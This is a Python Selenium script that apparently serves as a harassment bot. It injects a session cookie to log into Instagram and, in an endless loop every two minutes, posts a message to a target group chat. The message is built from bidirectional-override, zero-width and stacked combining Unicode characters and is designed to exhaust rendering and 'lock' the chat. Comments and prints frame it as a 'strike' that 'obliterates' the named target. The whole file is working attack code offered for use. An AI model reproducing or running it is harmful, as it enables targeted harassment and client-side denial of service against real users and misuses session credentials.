# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (MONOLITH V4 - INFINITE)
# 📅 STATUS: DENSITY x30 | SHADOW-REFRESH | 2-MIN LOOP

import os, time, random, sys, gc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

def get_monolith_payload(target_name):
    """The Monolith: One message, x30 density rendering exhaustion."""
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 STATUS: PERMANENT OBLITERATION\n"
    trap = "\u2060" * 80
    z_tower = "̸" * 300
    bidi_logic = "\u202E\u2066\u202D\u2067" * 12
    
    lines = [header]
    for i in range(80):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{prefix}{trap}{target_name.upper()}{z_tower}{bidi_logic}")
    
    return "\n".join(lines)[:9995]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    if not cookie or not target_id:
        print("❌ MISSING SECRETS")
        sys.exit(1)

    print(f"🚀 STARTING INFINITE LOCKDOWN FOR {target_name.upper()}...")
    
    while True: # 🔄 THE INFINITE LOOP
        driver = None
        try:
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(10)
            
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(15)

            # --- THE STRIKE ---
            box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
            payload = get_monolith_payload(target_name)
            
            driver.execute_script("""
                var box = arguments[0];
                var text = arguments[1];
                document.execCommand('insertText', false, text);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                
                setTimeout(function(){
                    var enterEvent = new KeyboardEvent('keydown', {
                        bubbles: true, cancelable: true, keyCode: 13, key: 'Enter'
                    });
                    box.dispatchEvent(enterEvent);
                }, 500);
            """, box, payload)
            
            print(f"💀 MONOLITH LANDED | TARGET IS NOW LOCKED.")
            time.sleep(3)
            
            # Shadow-Mode Cleanup
            driver.execute_script("window.stop();")
            driver.quit()
            driver = None
            
            # --- THE COOLDOWN ---
            print(f"⏳ STANDBY: Next wave in 120 seconds...")
            time.sleep(120) 

        except Exception as e:
            print(f"⚠️ CYCLE ERROR (Probably lag): {e}")
            if driver: driver.quit()
            time.sleep(10) # Quick retry if it fails
        finally:
            gc.collect()

if __name__ == "__main__":
    main()
